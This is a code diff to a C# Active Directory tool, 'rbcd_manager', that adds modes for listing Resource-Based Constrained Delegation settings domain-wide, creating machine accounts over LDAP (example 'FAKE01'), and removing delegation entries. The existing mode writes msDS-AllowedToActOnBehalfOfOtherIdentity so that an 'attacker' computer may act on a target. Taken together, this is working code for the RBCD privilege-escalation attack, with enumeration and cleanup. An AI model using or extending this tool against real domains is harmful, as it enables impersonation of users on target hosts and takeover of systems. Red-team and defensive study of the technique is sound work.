@@ -4,6 +4,7 @@ using System.Diagnostics.Eventing.Reader;
 using System.DirectoryServices.Protocols;
 using System.Security.AccessControl;
 using System.Security.Principal;
+using System.Text;
 
 namespace RBCD_Configurator
 {
@@ -23,8 +24,10 @@ namespace RBCD_Configurator
                 return;
             }
 
+            string command = args[0].ToLower();
+
             // Modo verificación
-            if (args[0].ToLower() == "-verify" || args[0].ToLower() == "--verify")
+            if (command == "-verify" || command == "--verify")
             {
                 if (args.Length < 2)
                 {
@@ -47,6 +50,85 @@ namespace RBCD_Configurator
                 return;
             }
 
+            // Modo listar configuraciones RBCD
+            if (command == "-list" || command == "--list")
+            {
+                if (args.Length < 2)
+                {
+                    Console.WriteLine("[!] Error: Domain required for list mode");
+                    Console.WriteLine("Usage: rbcd_manager.exe -list <domain>");
+                    Console.WriteLine("Example: rbcd_manager.exe -list CONTOSO.LOCAL");
+                    return;
+                }
+
+                string domainName = args[1];
+                try
+                {
+                    ListRBCDConfigurations(domainName);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[!] Error: " + ex.Message);
+                    Console.WriteLine("[!] Stack trace: " + ex.StackTrace);
+                }
+                return;
+            }
+
+            // Modo crear cuenta de computadora
+            if (command == "-create" || command == "--create")
+            {
+                if (args.Length < 3)
+                {
+                    Console.WriteLine("[!] Error: Computer name and domain required");
+                    Console.WriteLine("Usage: rbcd_manager.exe -create <computer_name> <domain> [password]");
+                    Console.WriteLine("Example: rbcd_manager.exe -create FAKE01 CONTOSO.LOCAL MyP@ssw0rd");
+                    return;
+                }
+
+                string computerName = args[1];
+                string domain = args[2];
+                string password = args.Length >= 4 ? args[3] : GenerateRandomPassword();
+
+                try
+                {
+                    CreateComputerAccount(computerName, domain, password);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[!] Error: " + ex.Message);
+                    Console.WriteLine("[!] Stack trace: " + ex.StackTrace);
+                }
+                return;
+            }
+
+            // Modo remover RBCD
+            if (command == "-remove" || command == "--remove")
+            {
+                if (args.Length < 3)
+                {
+                    Console.WriteLine("[!] Error: Target computer and domain required");
+                    Console.WriteLine("Usage: rbcd_manager.exe -remove <target_computer> <domain> [attacker_computer]");
+                    Console.WriteLine("Example: rbcd_manager.exe -remove WEB01 CONTOSO.LOCAL ATTACKER01");
+                    Console.WriteLine("         rbcd_manager.exe -remove WEB01 CONTOSO.LOCAL (removes all RBCD)");
+                    return;
+                }
+
+                string targetComputer = args[1];
+                string domain = args[2];
+                string attackerComputer = args.Length >= 4 ? args[3] : null;
+
+                try
+                {
+                    RemoveRBCD(targetComputer, domain, attackerComputer);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[!] Error: " + ex.Message);
+                    Console.WriteLine("[!] Stack trace: " + ex.StackTrace);
+                }
+                return;
+            }
+
             // Modo configuración RBCD
             if (args.Length < 3)
             {
@@ -54,13 +136,13 @@ namespace RBCD_Configurator
                 return;
             }
 
-            string targetComputer = args[0];
-            string attackerComputer = args[1];
-            string domain = args[2];
+            string targetComp = args[0];
+            string attackerComp = args[1];
+            string dom = args[2];
 
             try
             {
-                ConfigureRBCD(targetComputer, attackerComputer, domain);
+                ConfigureRBCD(targetComp, attackerComp, dom);
             }
             catch (Exception ex)
             {
@@ -93,10 +175,449 @@ Usage:
       
       Example: rbcd_manager.exe -verify CONTOSO.LOCAL
 
+  [3] List RBCD Configurations:
+      rbcd_manager.exe -list <domain>
+      
+      Lists all computers in the domain and shows which principals are allowed to
+      delegate to them via RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity attribute).
+      
+      Example: rbcd_manager.exe -list CONTOSO.LOCAL
+
+  [4] Create Computer Account:
+      rbcd_manager.exe -create <computer_name> <domain> [password]
+      
+      Creates a new computer account in the domain. If no password is provided,
+      a random secure password will be generated.
+      
+      Example: rbcd_manager.exe -create FAKE01 CONTOSO.LOCAL MyP@ssw0rd
+               rbcd_manager.exe -create FAKE01 CONTOSO.LOCAL
+
+  [5] Remove RBCD Configuration:
+      rbcd_manager.exe -remove <target_computer> <domain> [attacker_computer]
+      
+      Removes RBCD configuration from a target computer.
+      - If attacker_computer is specified: removes only that specific SID
+      - If attacker_computer is omitted: removes ALL RBCD configuration
+      
+      Example: rbcd_manager.exe -remove WEB01 CONTOSO.LOCAL ATTACKER01
+               rbcd_manager.exe -remove WEB01 CONTOSO.LOCAL
+
 Note: Computer names can be with or without $ suffix.
       Will use current security context for authentication.
-      Verification mode filters out computers where only 'Self' has permissions.
 ");
+        }
+
+        static string GenerateRandomPassword()
+        {
+            const string validChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
+            StringBuilder password = new StringBuilder();
+            Random random = new Random();
+
+            for (int i = 0; i < 24; i++)
+            {
+                password.Append(validChars[random.Next(validChars.Length)]);
+            }
+
+            return password.ToString();
+        }
+
+        static void CreateComputerAccount(string computerName, string domain, string password)
+        {
+            if (!computerName.EndsWith("$"))
+                computerName += "$";
+
+            Console.WriteLine("[*] Creating computer account: " + computerName);
+            Console.WriteLine("[*] Domain: " + domain);
+            Console.WriteLine("[*] Using: " + WindowsIdentity.GetCurrent().Name);
+            Console.WriteLine();
+
+            LdapConnection ldapConnection = new LdapConnection(new LdapDirectoryIdentifier(domain));
+            ldapConnection.SessionOptions.ProtocolVersion = 3;
+            ldapConnection.SessionOptions.SecureSocketLayer = false;
+            ldapConnection.SessionOptions.Sealing = true;
+            ldapConnection.SessionOptions.Signing = true;
+            ldapConnection.AuthType = AuthType.Negotiate;
+
+            try
+            {
+                ldapConnection.Bind();
+                Console.WriteLine("[+] Authenticated to " + domain);
+            }
+            catch (LdapException ex)
+            {
+                Console.WriteLine("[!] LDAP bind failed: " + ex.Message);
+                ldapConnection.AuthType = AuthType.Kerberos;
+                ldapConnection.Bind();
+                Console.WriteLine("[+] Authenticated with Kerberos");
+            }
+
+            // Verificar si la cuenta ya existe
+            try
+            {
+                string existingDN = FindComputerDN(ldapConnection, computerName, domain);
+                Console.WriteLine("[!] Computer account already exists: " + existingDN);
+                ldapConnection.Dispose();
+                return;
+            }
+            catch
+            {
+                // No existe, continuar con la creación
+                Console.WriteLine("[+] Computer account does not exist, proceeding with creation");
+            }
+
+            string searchBase = "DC=" + domain.Replace(".", ",DC=");
+            string computersContainer = "CN=Computers," + searchBase;
+            string computerDN = "CN=" + computerName.TrimEnd('$') + "," + computersContainer;
+
+            Console.WriteLine("[*] Target DN: " + computerDN);
+            Console.WriteLine("[*] Password length: " + password.Length + " characters");
+
+            // Crear cuenta con password desde el inicio
+            Console.WriteLine("[*] Attempting creation with password...");
+
+            try
+            {
+                AddRequest addRequest = new AddRequest(computerDN);
+                addRequest.Attributes.Add(new DirectoryAttribute("objectClass", "computer"));
+                addRequest.Attributes.Add(new DirectoryAttribute("sAMAccountName", computerName));
+
+                string quotedPassword = "\"" + password + "\"";
+                byte[] passwordBytes = Encoding.Unicode.GetBytes(quotedPassword);
+                addRequest.Attributes.Add(new DirectoryAttribute("unicodePwd", passwordBytes));
+                addRequest.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
+
+                string dnsHostname = computerName.TrimEnd('$') + "." + domain.ToLower();
+                addRequest.Attributes.Add(new DirectoryAttribute("dNSHostName", dnsHostname));
+                addRequest.Attributes.Add(new DirectoryAttribute("servicePrincipalName", new string[] {
+                    "HOST/" + computerName.TrimEnd('$'),
+                    "HOST/" + dnsHostname,
+                    "RestrictedKrbHost/" + computerName.TrimEnd('$'),
+                    "RestrictedKrbHost/" + dnsHostname
+                }));
+
+                AddResponse addResponse = (AddResponse)ldapConnection.SendRequest(addRequest);
+                Console.WriteLine("[+] Computer account created successfully (with password)!");
+                Console.WriteLine("[+] DN: " + computerDN);
+                Console.WriteLine("[+] Password: " + password);
+                Console.WriteLine();
+                Console.WriteLine("[*] IMPORTANT: Save this password, it cannot be retrieved later!");
+                ldapConnection.Dispose();
+                return;
+            }
+            catch (DirectoryOperationException ex)
+            {
+                Console.WriteLine("[!] Creation with password failed: " + ex.Response.ResultCode);
+                Console.WriteLine("[!] Error message: " + ex.Message);
+
+                if (ex.Response.ErrorMessage != null && ex.Response.ErrorMessage.Length > 0)
+                {
+                    Console.WriteLine("[!] Extended error: " + ex.Response.ErrorMessage);
+                }
+
+                if (ex.Response.ResultCode == ResultCode.InsufficientAccessRights)
+                {
+                    Console.WriteLine();
+                    Console.WriteLine("[!] Insufficient permissions to create computer account");
+                    Console.WriteLine("[!] Required permissions:");
+                    Console.WriteLine("    - 'Create Computer Objects' in the Computers container");
+                    Console.WriteLine("    - Or be member of 'Account Operators' or 'Domain Admins'");
+                }
+                else if (ex.Response.ResultCode == ResultCode.UnwillingToPerform)
+                {
+                    Console.WriteLine();
+                    Console.WriteLine("[!] Server refused to perform the operation");
+                    Console.WriteLine("[!] Possible causes:");
+                    Console.WriteLine("    - Password complexity requirements not met");
+                    Console.WriteLine("    - Machine account quota exceeded (default is 10 per user)");
+                    Console.WriteLine("    - Connection not encrypted (password transmission)");
+                    Console.WriteLine();
+                    Console.WriteLine("[*] Current password: " + password);
+                    Console.WriteLine("[*] Try checking: ms-DS-MachineAccountQuota attribute on domain");
+                }
+                else if (ex.Response.ResultCode == ResultCode.ConstraintViolation)
+                {
+                    Console.WriteLine();
+                    Console.WriteLine("[!] Constraint violation - Password doesn't meet requirements");
+                }
+
+                ldapConnection.Dispose();
+                return;
+            }
+        }
+
+        static void ListRBCDConfigurations(string domainName)
+        {
+            Console.WriteLine("[*] Listing RBCD configurations");
+            Console.WriteLine("[*] Domain: " + domainName);
+            Console.WriteLine("[*] Current user: " + WindowsIdentity.GetCurrent().Name);
+            Console.WriteLine();
+
+            LdapConnection ldapConnection = new LdapConnection(new LdapDirectoryIdentifier(domainName));
+            ldapConnection.SessionOptions.ProtocolVersion = 3;
+            ldapConnection.AuthType = AuthType.Negotiate;
+
+            try
+            {
+                ldapConnection.Bind();
+                Console.WriteLine("[+] Authenticated to " + domainName);
+            }
+            catch (LdapException ex)
+            {
+                Console.WriteLine("[!] LDAP bind failed: " + ex.Message);
+                ldapConnection.AuthType = AuthType.Kerberos;
+                ldapConnection.Bind();
+                Console.WriteLine("[+] Authenticated with Kerberos");
+            }
+
+            Console.WriteLine("[*] Enumerating computers in domain...");
+            List<string> computers = GetAllComputers(ldapConnection, domainName);
+            Console.WriteLine("[+] Found " + computers.Count + " computers");
+            Console.WriteLine();
+
+            Console.WriteLine("================================================================================");
+            Console.WriteLine(String.Format("{0,-30} {1}", "Name", "PrincipalsAllowedToDelegateToAccount"));
+            Console.WriteLine(String.Format("{0,-30} {1}", "----", "------------------------------------"));
+
+            int configuredCount = 0;
+
+            foreach (string computerDN in computers)
+            {
+                string computerName = GetComputerNameFromDN(computerDN);
+                List<string> allowedPrincipals = GetRBCDConfiguration(ldapConnection, computerDN, domainName);
+
+                if (allowedPrincipals.Count > 0)
+                {
+                    configuredCount++;
+                    Console.WriteLine(String.Format("{0,-30} {{{1}}}", computerName, String.Join(", ", allowedPrincipals)));
+                }
+                else
+                {
+                    Console.WriteLine(String.Format("{0,-30} {{}}", computerName));
+                }
+            }
+
+            Console.WriteLine("================================================================================");
+            Console.WriteLine();
+            Console.WriteLine("[+] Total computers: " + computers.Count);
+            Console.WriteLine("[+] Computers with RBCD configured: " + configuredCount);
+            Console.WriteLine("[+] Computers without RBCD: " + (computers.Count - configuredCount));
+
+            ldapConnection.Dispose();
+        }
+
+        static string GetComputerNameFromDN(string distinguishedName)
+        {
+            // Extrae el nombre de la computadora del DN
+            // Ejemplo: "CN=LON-DC-1,OU=Domain Controllers,DC=contoso,DC=com" -> "LON-DC-1"
+            if (distinguishedName.StartsWith("CN="))
+            {
+                int startIndex = 3; // Después de "CN="
+                int endIndex = distinguishedName.IndexOf(',');
+                if (endIndex > startIndex)
+                {
+                    return distinguishedName.Substring(startIndex, endIndex - startIndex);
+                }
+            }
+            return distinguishedName;
+        }
+
+        static List<string> GetRBCDConfiguration(LdapConnection connection, string distinguishedName, string domain)
+        {
+            List<string> allowedPrincipals = new List<string>();
+
+            try
+            {
+                SearchRequest searchRequest = new SearchRequest(
+                    distinguishedName,
+                    "(objectClass=*)",
+                    SearchScope.Base,
+                    new string[] { "msDS-AllowedToActOnBehalfOfOtherIdentity" }
+                );
+
+                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
+
+                if (searchResponse.Entries.Count == 0)
+                    return allowedPrincipals;
+
+                if (!searchResponse.Entries[0].Attributes.Contains("msDS-AllowedToActOnBehalfOfOtherIdentity"))
+                    return allowedPrincipals;
+
+                byte[] securityDescriptor = searchResponse.Entries[0].Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"][0] as byte[];
+
+                if (securityDescriptor == null || securityDescriptor.Length == 0)
+                    return allowedPrincipals;
+
+                RawSecurityDescriptor sd = new RawSecurityDescriptor(securityDescriptor, 0);
+
+                foreach (CommonAce ace in sd.DiscretionaryAcl)
+                {
+                    string sid = ace.SecurityIdentifier.Value;
+                    string principalDN = ResolveSidToDN(connection, sid, domain);
+                    if (!string.IsNullOrEmpty(principalDN))
+                    {
+                        allowedPrincipals.Add(principalDN);
+                    }
+                }
+            }
+            catch (Exception)
+            {
+                // Ignorar errores en computadoras individuales
+            }
+
+            return allowedPrincipals;
+        }
+
+        static string ResolveSidToDN(LdapConnection connection, string sid, string domain)
+        {
+            try
+            {
+                string searchBase = "DC=" + domain.Replace(".", ",DC=");
+                string filter = "(objectSid=" + ConvertSidToSearchFilter(sid) + ")";
+
+                SearchRequest searchRequest = new SearchRequest(
+                    searchBase,
+                    filter,
+                    SearchScope.Subtree,
+                    new string[] { "distinguishedName" }
+                );
+
+                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
+
+                if (searchResponse.Entries.Count > 0)
+                {
+                    return searchResponse.Entries[0].DistinguishedName;
+                }
+            }
+            catch (Exception)
+            {
+                // Si no se puede resolver, retornar el SID
+            }
+
+            return "SID=" + sid;
+        }
+
+        static void RemoveRBCD(string targetComputer, string domain, string attackerComputer)
+        {
+            if (!targetComputer.EndsWith("$"))
+                targetComputer += "$";
+
+            Console.WriteLine("[*] Removing RBCD configuration from: " + targetComputer);
+            Console.WriteLine("[*] Domain: " + domain);
+            Console.WriteLine("[*] Using: " + WindowsIdentity.GetCurrent().Name);
+
+            if (attackerComputer != null)
+            {
+                if (!attackerComputer.EndsWith("$"))
+                    attackerComputer += "$";
+                Console.WriteLine("[*] Removing specific SID: " + attackerComputer);
+            }
+            else
+            {
+                Console.WriteLine("[*] Removing ALL RBCD configuration");
+            }
+
+            Console.WriteLine();
+
+            LdapConnection ldapConnection = new LdapConnection(new LdapDirectoryIdentifier(domain));
+            ldapConnection.SessionOptions.ProtocolVersion = 3;
+            ldapConnection.AuthType = AuthType.Negotiate;
+
+            try
+            {
+                ldapConnection.Bind();
+                Console.WriteLine("[+] Authenticated to " + domain);
+            }
+            catch (LdapException ex)
+            {
+                Console.WriteLine("[!] LDAP bind failed: " + ex.Message);
+                ldapConnection.AuthType = AuthType.Kerberos;
+                ldapConnection.Bind();
+                Console.WriteLine("[+] Authenticated with Kerberos");
+            }
+
+            Console.WriteLine("[*] Searching for " + targetComputer);
+            string targetDN = FindComputerDN(ldapConnection, targetComputer, domain);
+            Console.WriteLine("[+] Found target: " + targetDN);
+
+            byte[] existingSD = GetExistingSecurityDescriptor(ldapConnection, targetDN);
+
+            if (existingSD == null || existingSD.Length == 0)
+            {
+                Console.WriteLine("[!] No RBCD configuration found on target computer");
+                ldapConnection.Dispose();
+                return;
+            }
+
+            if (attackerComputer == null)
+            {
+                // Remover toda la configuración RBCD
+                Console.WriteLine("[*] Clearing all RBCD configuration...");
+                ModifyAttribute(ldapConnection, targetDN, "msDS-AllowedToActOnBehalfOfOtherIdentity", null);
+                Console.WriteLine("[+] All RBCD configuration removed successfully!");
+            }
+            else
+            {
+                // Remover solo un SID específico
+                Console.WriteLine("[*] Searching for " + attackerComputer);
+                string attackerDN = FindComputerDN(ldapConnection, attackerComputer, domain);
+                Console.WriteLine("[+] Found attacker: " + attackerDN);
+
+                string attackerSid = GetObjectSid(ldapConnection, attackerDN);
+                Console.WriteLine("[+] Attacker SID: " + attackerSid);
+
+                string newSD = RemoveSidFromSecurityDescriptor(existingSD, attackerSid);
+
+                if (newSD == null)
+                {
+                    Console.WriteLine("[!] SID not found in RBCD configuration");
+                }
+                else
+                {
+                    ModifyAttribute(ldapConnection, targetDN, "msDS-AllowedToActOnBehalfOfOtherIdentity", newSD);
+                    Console.WriteLine("[+] RBCD configuration updated successfully!");
+                    Console.WriteLine("[+] Removed " + attackerComputer + " from delegation list");
+                }
+            }
+
+            ldapConnection.Dispose();
+        }
+
+        static string RemoveSidFromSecurityDescriptor(byte[] existingSDBytes, string sidToRemove)
+        {
+            RawSecurityDescriptor sd = new RawSecurityDescriptor(existingSDBytes, 0);
+            Console.WriteLine("[*] Current RBCD entries: " + sd.DiscretionaryAcl.Count);
+
+            bool sidFound = false;
+            int indexToRemove = -1;
+
+            for (int i = 0; i < sd.DiscretionaryAcl.Count; i++)
+            {
+                CommonAce ace = sd.DiscretionaryAcl[i] as CommonAce;
+                if (ace != null && ace.SecurityIdentifier.Value == sidToRemove)
+                {
+                    sidFound = true;
+                    indexToRemove = i;
+                    break;
+                }
+            }
+
+            if (!sidFound)
+            {
+                return null;
+            }
+
+            sd.DiscretionaryAcl.RemoveAce(indexToRemove);
+            Console.WriteLine("[+] SID removed. Remaining entries: " + sd.DiscretionaryAcl.Count);
+
+            if (sd.DiscretionaryAcl.Count == 0)
+            {
+                Console.WriteLine("[*] No more entries, will clear the attribute entirely");
+                return "";
+            }
+
+            byte[] sdBytes = new byte[sd.BinaryLength];
+            sd.GetBinaryForm(sdBytes, 0);
+            return Convert.ToBase64String(sdBytes);
         }
 
         static void VerifyRBCDPermissions(string domainName)
@@ -147,7 +668,6 @@ Note: Computer names can be with or without $ suffix.
                 {
                     totalWithPermissions++;
 
-                    // FILTRO CRÍTICO: Remover el SID de "Self" de la lista
                     List<string> filteredSids = new List<string>();
                     foreach (string sid in permittedSids)
                     {
@@ -157,7 +677,6 @@ Note: Computer names can be with or without $ suffix.
                         }
                     }
 
-                    // Solo mostrar si hay SIDs además de Self
                     if (filteredSids.Count > 0)
                     {
                         vulnerableCount++;
